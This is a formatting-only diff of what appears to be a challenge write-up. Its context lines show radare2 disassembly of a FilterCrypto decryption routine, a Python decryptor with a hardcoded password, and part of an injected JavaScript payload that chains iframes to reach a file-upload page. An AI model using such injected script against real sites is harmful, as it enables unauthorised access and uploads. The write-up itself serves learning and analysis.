@@ -59,7 +59,7 @@ Let's download and try to figure out how it decrypts the files. Here we are goin
 
 ```
 0x00001c20]> ii~parser
-  78 0x00000000  GLOBAL  NOTYPE PL_parser
+78 0x00000000  GLOBAL  NOTYPE PL_parser
 ```
 
 Then find cross-references:
@@ -85,7 +85,7 @@ Ok, so that `FilterCrypto_FilterDecrypt` is our target function. When disassembl
 |           0x00002b04      48890424       mov qword [rsp], rax
 |           0x00002b08      e863efffff     call sym.imp.PKCS5_PBKDF2_HMAC_SHA1
 ...
-0x00003304      e817e7ffff     call sym.imp.EVP_aes_256_cbc
+|           0x00003304      e817e7ffff     call sym.imp.EVP_aes_256_cbc
 ...
 ```
 
@@ -107,9 +107,6 @@ from Crypto.Cipher import AES
 import Crypto.Cipher.AES
 from binascii import hexlify, unhexlify
 from backports.pbkdf2 import pbkdf2_hmac
-
-
-
 
 def unfilter(salt, IV, encrypted):
     password = unhexlify('449d2aceab44c041559998026c2a9a4f85338f197c50eb961897b5b6ccee0f1a') # Hardcoded password
@@ -272,7 +269,7 @@ var check = 0;
 i.setAttribute("src", document.getElementsByTagName("a")[4]["href"]);
 i.setAttribute("id", "pwn1");
 i.addEventListener("load", function() {
-    //Wait to load the iframe and then submit the form to go to the page where we can upload the file
+    // Wait to load the iframe and then submit the form to go to the page where we can upload the file
 
     var f = document.createElement("iframe");
     f.setAttribute("src", window.frames["pwn1"].contentDocument.getElementsByTagName("a")[14]["href"]);
@@ -302,8 +299,7 @@ i.addEventListener("load", function() {
     });
 
     document.body.appendChild(f);
-    
-    
+
 });
 document.body.appendChild(i);
 ``` 
